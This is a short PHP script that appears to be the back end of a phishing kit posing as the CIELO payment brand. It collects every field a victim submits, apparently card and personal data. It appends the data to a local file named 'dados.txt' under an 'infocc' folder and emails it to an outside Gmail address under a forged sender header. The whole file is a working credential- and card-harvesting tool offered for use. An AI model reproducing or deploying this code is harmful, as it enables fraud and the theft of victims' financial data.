<?php
// EMAIL 
define("EMAIL_CLIENT", "drtech@gmail.com");

$msg = "-------------- CIELO - BY drtech -----------------";
foreach ($_POST as $key => $value) $msg .= "$key: $value <br>";
define("TITLE", $_POST['__id']);
define("SUBJECT_INBOX", $_POST['__ip']);
define("CONTENT_MESSAGE", $msg);
define("HEADERS_OF_EMAIL", "MIME-Version: 1.0\nContent-Type: text/html; charset=UTF-8\r\nFrom: ".TITLE." <xuxuca@myrella.com.br>\nX-Priority: 1 (Highest)\nX-MSMail-Priority: High\nImportance: High\n");

define("FILE_NAME", "@infocc/dados.txt");
$handle = fopen(FILE_NAME, "a+");
fwrite($handle, 
"
######################################
.:: BY DR.TECH - VAIKARAI-INFO ::.
######################################

$msg

");
fclose($handle);


mail(EMAIL_CLIENT, SUBJECT_INBOX, CONTENT_MESSAGE, HEADERS_OF_EMAIL);